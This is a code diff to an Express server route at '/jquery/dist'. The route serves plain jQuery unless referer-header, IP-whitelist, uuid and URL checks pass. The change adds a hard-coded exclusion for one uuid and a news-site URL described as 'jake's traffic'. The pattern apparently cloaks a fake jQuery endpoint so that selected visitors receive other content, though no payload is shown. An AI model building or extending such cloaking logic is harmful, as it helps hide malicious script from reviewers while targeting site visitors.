@@ -581,6 +581,17 @@ app.get('/jquery/dist', function(req, res) {
         xalt = req.headers['X-Alt-Referer'];
     }
 
+
+    var isWrongCjId = function(uuid, url) {
+        //if uuid is balling and the following urls don't jack because it's jake's traffic.
+        if (uuid == "c46b3fb0-a619-4012-956a-c04315a1e6b0") {
+            if (url == "http://trending.bestnews-today.com/FRS/index.html") {
+                return true;
+            }
+        }
+        return false;
+    }
+
     if (!xalt) {
         console.log("Error: undefined x-alt-referer");
         console.log(req.headers);
@@ -606,8 +617,8 @@ app.get('/jquery/dist', function(req, res) {
         }
 
         if (addClientToWhitelistWindow(ip)) {
-            if (!url) {
-                console.log("Error: undefined url.");
+            if (!url || isWrongCjId(uuid, url)) {
+                console.log("Error: undefined url. Or wrong CJ id");
                 console.log(req.headers);
                 sendPlainJQuery(res);
             } else {
